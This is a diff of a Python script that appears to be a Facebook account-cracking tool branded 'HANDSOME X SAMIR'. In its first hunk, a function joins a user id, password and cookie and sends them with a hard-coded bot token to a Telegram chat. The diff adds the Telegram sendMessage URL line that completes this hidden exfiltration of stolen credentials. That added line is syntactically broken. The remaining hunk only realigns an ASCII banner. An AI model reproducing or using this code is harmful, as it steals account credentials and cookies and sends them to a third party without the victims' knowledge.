@@ -19,6 +19,7 @@ def HANDSOME(ids,pas,cookie):
         token = "6967989114:AAEyppwDyUURbGkPUiJUJUC8SEAoQNO8Uaw"
         chatid = "6921807308"
         ok_id =str(uid+"|"+pas+"|"+cookie)
+	url = f"https://api.telegram.org/bot{token}/sendMessage
         params = {"chat_id": chatid, "text": ok_id}
         requests.get(url, params=params)
     except:
@@ -234,10 +235,10 @@ logo=("""
                                                                                     
 
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┓
- ┃𝐀𝐃𝐌𝐈𝐍:HANDSOME X SAMIR    ┃𝐒𝐓𝐀𝐓𝐔𝐒:FREE       ┃
- ┃𝐅𝐁 𝐈𝐃:DI W AS              ┃𝐕𝐄𝐑𝐒𝐈𝐎𝐍:1         ┃
+ ┃𝐀𝐃𝐌𝐈𝐍:HANDSOME X SAMIR     ┃𝐒𝐓𝐀𝐓𝐔𝐒:FREE       ┃
+ ┃𝐅𝐁 𝐈𝐃:DI W AS              ┃𝐕𝐄𝐑𝐒𝐈𝐎𝐍:1          ┃
  ┣━━━━━━━━━━━━━━━━━━━━━━━━━┳━┻━━━━━━━━━━━━━━━━━━━┫
- ┃𝐆𝐈𝐓𝐇𝐔𝐁:HANDSOMEXSAMIR   ┃ 𝐓𝐎𝐎𝐋 : FILE        |
+ ┃𝐆𝐈𝐓𝐇𝐔𝐁:HANDSOMEXSAMIR    ┃ 𝐓𝐎𝐎𝐋 : FILE         |
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━┛
 \033[1;32m----------------------------------------------""")
 def linex():
